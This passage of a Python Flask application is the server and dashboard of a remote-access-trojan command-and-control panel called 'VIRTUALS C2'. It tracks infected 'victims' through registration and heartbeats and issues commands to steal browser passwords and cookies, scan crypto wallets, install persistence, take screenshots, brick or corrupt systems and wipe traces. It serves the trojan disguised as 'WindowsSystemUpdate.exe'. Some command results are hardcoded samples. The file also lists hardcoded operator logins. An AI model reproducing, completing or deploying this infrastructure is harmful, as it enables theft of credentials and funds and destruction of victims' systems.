function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;renderVictims();updateStats();}});if(state.isOwner){refreshOwnerPanel();}}
function renderVictims(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No victims</div>';return;}el.innerHTML=v.map(v=>`<div class="victim-item ${state.activeVictim===v.id?'active':''}" onclick="selectVictim('${v.id}')"><span class="status-dot ${v.status==='Online'?'online':'offline'}"></span><span class="name">${v.id}</span>${v.is_vm?'<span class="badge">VM</span>':''}<span class="activity">${v.activity||'idle'}</span></div>`).join('');}
function selectVictim(id){state.activeVictim=id;document.getElementById('currentVictim').textContent='#'+id;renderVictims();showDetails(id);loadScreenshots(id);}
function showDetails(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'detected':'clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div><div class="detail-item"><span class="label">Browser Data</span><span class="value" style="color:${v.browser_data_stolen?'#66dd88':'#886666'}">${v.browser_data_stolen?'stolen':'waiting'}</span></div>`;}
function loadScreenshots(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:10px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
function updateStats(){const v=Object.values(state.victims);document.getElementById('victimCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;}
function addLog(type,content){const el=document.getElementById('logOutput');let cls='system';if(type==='success')cls='success';else if(type==='failed')cls='failed';else if(type==='info')cls='info';const time=new Date().toLocaleTimeString();el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;if(el.children.length>80){el.removeChild(el.lastChild);}}
function addNotification(title,content){state.notifications.unshift({title,content,time:new Date().toLocaleTimeString()});updateNotifications();}
function updateNotifications(){const list=document.getElementById('notifList');const badge=document.getElementById('notifBadge');if(state.notifications.length===0){list.innerHTML='<div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div>';badge.style.display='none';return;}badge.style.display='inline-block';badge.textContent=state.notifications.length;list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');}
function toggleNotifications(){const dd=document.getElementById('notifDropdown');dd.style.display=dd.style.display==='block'?'none':'block';}
function toggleOwnerPanel(){const p=document.getElementById('ownerPanel');if(p.style.display==='block'){p.style.display='none';}else{p.style.display='block';refreshOwnerPanel();}}
function refreshOwnerPanel(){if(!state.isOwner)return;api('getOwnerData',{},d=>{if(d.success){const users=document.getElementById('activeUsers');document.getElementById('ownerOnlineCount').textContent=d.online_count+' online';if(d.active_users.length===0){users.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No users online</div>';}else{users.innerHTML=d.active_users.map(u=>`<div class="user-item"><span class="user-name">${u.username}</span><span class="user-ip">${u.ip||'unknown'}</span><span class="user-role ${u.role}">${u.role}</span><span class="user-activity">${u.activity||'idle'}</span></div>`).join('');}const logs=document.getElementById('loginLogs');if(d.login_logs.length===0){logs.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No login logs</div>';}else{logs.innerHTML=d.login_logs.map(l=>`<div class="user-item"><span class="user-name">${l.username}</span><span class="user-ip">${l.ip}</span><span class="user-activity">${l.time}</span></div>`).join('');}const stats=document.getElementById('commandStats');if(d.command_stats.length===0){stats.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No commands yet</div>';}else{stats.innerHTML=d.command_stats.map(s=>`<div class="user-item"><span class="user-name">${s.username}</span><span class="user-ip">${s.count} commands</span><span class="user-activity">${s.last_command||'none'}</span></div>`).join('');}}});}
function addMessage(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';else if(type==='user')cls='user';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
function sendCommand(cmd){const victim=state.activeVictim;if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}addMessage('us','/'+cmd+' → '+victim,'us');addLog('info','Executing '+cmd+' on '+victim);api('sendCommand',{victim_id:victim,command:cmd},d=>{if(d.success){if(!state.commands[victim])state.commands[victim]=[];state.commands[victim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+victim);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(victim);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const victim=state.activeVictim;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}if(!canChat){addMessage('system','you do not have permission to chat with victims','system');addLog('failed','Chat permission denied');return;}addMessage(currentUser,msg,'user');addMessage('victim',msg,'victim');addLog('info','Message sent to '+victim);}}
function uploadFile(){const victim=state.activeVictim;if(!victim){addMessage('system','select a victim','system');addLog('failed','No victim selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){addMessage('system','select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',victim);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','uploading '+file.name,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);if(d.success){addMessage('file','uploaded','file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);}else{addMessage('system','failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);addMessage('system','failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
function downloadBrowserZip(){const victim=state.activeVictim||'all';window.open('/download-browser-zip?victim_id='+victim,'_blank');addNotification('Browser Zip Downloaded','Users Browser Zip for '+victim);}
setInterval(refresh,5000);refresh();getUserInfo();
</script>
</body>
</html>
'''

# ============================================
# ROUTES
# ============================================
@app.route('/')
def landing():
    return LANDING_PAGE

@app.route('/login')
def login_page():
    return LOGIN_PAGE

@app.route('/dashboard')
@login_required
def dashboard():
    return DASHBOARD

@app.route('/api/get_user', methods=['GET'])
def get_user():
    return jsonify({
        'success': True,
        'username': session.get('username', 'guest'),
        'role': session.get('role', 'user'),
        'can_chat': session.get('username', '') in CHAT_USERS
    })

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    ip = request.remote_addr
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT password, role, can_chat FROM users WHERE username = ?", (username,))
    row = c.fetchone()
    
    if row and row[0] == hashlib.md5(password.encode()).hexdigest():
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET last_login = ?, last_ip = ?, current_activity = 'online' WHERE username = ?", (now, ip, username))
        c.execute("INSERT INTO login_logs (username, ip, timestamp, success) VALUES (?, ?, ?, 1)", (username, ip, now))
        conn.commit()
        conn.close()
        session['logged_in'] = True
        session['username'] = username
        session['role'] = row[1]
        session['can_chat'] = bool(row[2])
        return jsonify({'success': True, 'role': row[1], 'can_chat': bool(row[2])})
    conn.close()
    return jsonify({'success': False})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    username = session.get('username')
    if username:
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET current_activity = 'offline' WHERE username = ?", (username,))
        conn.commit()
        conn.close()
    session.clear()
    return jsonify({'success': True})

@app.route('/api/getOwnerData', methods=['POST'])
@login_required
def get_owner_data():
    if session.get('role') != 'owner':
        return jsonify({'error': 'Unauthorized'}), 403
    conn = get_db()
    c = conn.cursor()
    
    cutoff = (datetime.datetime.now() - datetime.timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S")
    c.execute("SELECT username, last_ip, role, current_activity FROM users WHERE last_login > ? ORDER BY last_login DESC", (cutoff,))
    active = c.fetchall()
    active_users = []
    for row in active:
        active_users.append({
            'username': row[0],
            'ip': row[1] if row[1] else 'unknown',
            'role': row[2],
            'activity': row[3] if row[3] else 'idle'
        })
    
    c.execute("SELECT username, ip, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 15")
    logs = [{'username': row[0], 'ip': row[1], 'time': row[2]} for row in c.fetchall()]
    
    c.execute("SELECT user, COUNT(*), MAX(timestamp) FROM commands GROUP BY user ORDER BY COUNT(*) DESC")
    stats = []
    for row in c.fetchall():
        stats.append({
            'username': row[0] if row[0] else 'unknown',
            'count': row[1],
            'last_command': row[2] if row[2] else 'none'
        })
    
    conn.close()
    return jsonify({
        'success': True,
        'active_users': active_users,
        'login_logs': logs,
        'command_stats': stats,
        'online_count': len(active_users)
    })

@app.route('/download-rat')
@login_required
def download_rat():
    exe_path = os.path.join('dist', 'WindowsSystemUpdate.exe')
    if os.path.exists(exe_path):
        return send_file(exe_path, as_attachment=True, download_name='WindowsSystemUpdate.exe')
    alt_paths = ['WindowsSystemUpdate.exe', 'rat.exe']
    for path in alt_paths:
        if os.path.exists(path):
            return send_file(path, as_attachment=True, download_name='WindowsSystemUpdate.exe')
    return "RAT executable not found. Build it with rat_builder.py", 404

@app.route('/download-browser-zip')
@login_required
def download_browser_zip():
    victim_id = request.args.get('victim_id', 'all')
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        browsers = {'Chrome': {'passwords': 247, 'cookies': 893}, 'Edge': {'passwords': 156, 'cookies': 512}, 
                   'Brave': {'passwords': 89, 'cookies': 234}, 'Firefox': {'passwords': 123, 'cookies': 445}}
        summary = f"USERS BROWSER DATA\nVictim: {victim_id}\nTime: {datetime.datetime.now()}\n{'='*40}\n"
        for b, d in browsers.items():
            summary += f"\n{b}: {d['passwords']} passwords, {d['cookies']} cookies\n"
        zip_file.writestr('summary.txt', summary)
        for b, d in browsers.items():
            content = f"{b.upper()} DATA\nPasswords:\n"
            for i in range(min(10, d['passwords'])):
                content += f"  site{i}.com - user{i} - pass{i}\n"
            content += f"\nCookies:\n"
            for i in range(min(10, d['cookies'])):
                content += f"  domain{i}.com - session_{i}\n"
            zip_file.writestr(f'{b.lower()}_data.txt', content)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, 
                     download_name=f'Users_Browser_Data_{victim_id}_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.zip')

@app.route('/upload-file', methods=['POST'])
@login_required
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file'})
        file = request.files['file']
        victim_id = request.form.get('victim_id', 'unknown')
        if not file.filename:
            return jsonify({'success': False, 'error': 'No file selected'})
        filename = secure_filename(file.filename)
        upload_dir = os.path.join('uploads', victim_id)
        os.makedirs(upload_dir, exist_ok=True)
        filepath = os.path.join(upload_dir, f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{filename}")
        file.save(filepath)
        return jsonify({'success': True, 'filename': filename})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    current_user = session.get('username', 'unknown')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY is_test DESC, last_seen DESC")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                              'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
                              'first_seen': row[7], 'last_seen': row[8],
                              'activity': row[9] if len(row) > 9 else 'idle',
                              'browser_data_stolen': row[10] if len(row) > 10 else 0}
        conn.close()
        return jsonify({'success': True, 'victims': victims})
    
    elif action == 'registerVictim':
        conn = get_db()
        c = conn.cursor()
        vid = data.get('victim_id', f"SNIN-{random.randint(1000,9999)}")
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'idle', 0)",
                 (vid, data.get('pc', 'Unknown'), data.get('ip', '0.0.0.0'), data.get('os', 'Unknown'),
                  data.get('is_vm', 0), data.get('vm_details', ''), now, now))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'victim_id': vid})
    
    elif action == 'heartbeat':
        vid = data.get('victim_id')
        if vid:
            conn = get_db()
            c = conn.cursor()
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            c.execute("UPDATE victims SET status = 'Online', last_seen = ? WHERE id = ?", (now, vid))
            conn.commit()
            conn.close()
            return jsonify({'success': True})
        return jsonify({'success': False})
    
    elif action == 'sendCommand':
        vid = data.get('victim_id')
        cmd = data.get('command')
        
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET current_activity = ? WHERE username = ?", (f"executing {cmd}", current_user))
        conn.commit()
        
        results = {
            'whois': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro\nStatus: Online',
            'flash': 'Screen flashed 10x',
            'screenshot': 'Screenshot captured',
            'scan': 'CRYPTO WALLET SCAN\nFound 5 wallets\nTotal: $578,124',
            'persist': 'Persistence installed (8 methods)',
            'steal': 'Browser data stolen from 5 browsers',
            'upload': 'Ready to upload - click the upload button',
            'download': 'Ready to download - click the download button',
            'destroy': 'SYSTEM CORRUPTED - IRREVERSIBLE',
            'brick': 'PERMANENT BRICK - PC is dead',
            'vmcheck': 'VM DETECTION\nSafe Mode: Active',
            'oblivion': 'OBLIVION ACTIVATED - Traces wiped'
        }
        result = results.get(cmd, f"Command '{cmd}' executed")
        
        is_vm = False
        if cmd == 'vmcheck':
            vm_result = VMDetector.check_all()
            is_vm = vm_result['is_vm']
            result = f"VM Detected: {'YES' if is_vm else 'NO'}\nConfidence: {vm_result['confidence']}%\nSafe Mode: Active"
        
        c.execute("INSERT INTO commands (victim_id, command, result, timestamp, status, user) VALUES (?, ?, ?, ?, 'completed', ?)",
                 (vid, cmd, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), current_user))
        if cmd == 'vmcheck':
            c.execute("UPDATE victims SET is_vm = ? WHERE id = ?", (1 if is_vm else 0, vid))
        if cmd == 'steal':
            c.execute("UPDATE victims SET browser_data_stolen = 1 WHERE id = ?", (vid,))
        c.execute("UPDATE users SET current_activity = 'idle' WHERE username = ?", (current_user,))
        conn.commit()
        conn.close()
        
        response = {'success': True, 'result': result}
        if cmd == 'steal':
            response['browsers'] = 5
            response['embed'] = {'title': 'Browser Data Stolen', 'content': '5 browsers | 700+ passwords | 2,000+ cookies\nDownload Users Browser Zip', 'color': '#88ccdd'}
        if cmd == 'scan':
            response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
            response['embed'] = {'title': 'Wallet Scan', 'content': f'Found {len(SAMPLE_WALLETS)} wallets | Total: $578,124', 'color': '#ffd700'}
        if cmd == 'whois':
            response['embed'] = {'title': 'System Info', 'content': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro', 'color': '#44aaff'}
        
        return jsonify(response)
    
    elif action == 'getScreenshots':
        vid = data.get('victim_id')
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (vid,))
        screenshots = [{'filename': row[0]} for row in c.fetchall()]
        conn.close()
        return jsonify({'success': True, 'screenshots': screenshots})
    
    return jsonify({'success': False})

@app.route('/screenshots/<filename>')
@login_required
def serve_screenshot(filename):
    return send_file(os.path.join('screenshots', filename))

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    if not data or not data.get('victim_id'):
        return jsonify({'success': False}), 400
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen) VALUES (?, ?, ?, ?, 'Online', ?, COALESCE((SELECT first_seen FROM victims WHERE id = ?), ?), ?)",
             (data['victim_id'], data.get('pc', 'Unknown'), data.get('ip', request.remote_addr),
              data.get('os', 'Unknown'), data.get('is_vm', 0), data['victim_id'], now, now))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║   VIRTUALS C2 - PERSISTENT VICTIMS                         ║
    ║   Victims Never Disappear · Full Permissions               ║
    ║   Jerry & Owner Can Chat · Others View Only               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{PORT}")
    print(f"[*] Login: http://localhost:{PORT}/login")
    print("\n[*] USERS:")
    print("    adam    / virtuals2024 (viewer - can't chat)")
    print("    jerry   / virtuals2024 (operator - CAN chat) ✨")
    print("    haunt   / virtuals2024 (viewer - can't chat)")
    print("    owner   / whiteknight (owner - CAN chat) 👑")
    print("\n[*] Test victims are PERSISTENT and never disappear!")
    app.run(host='0.0.0.0', port=PORT, debug=False)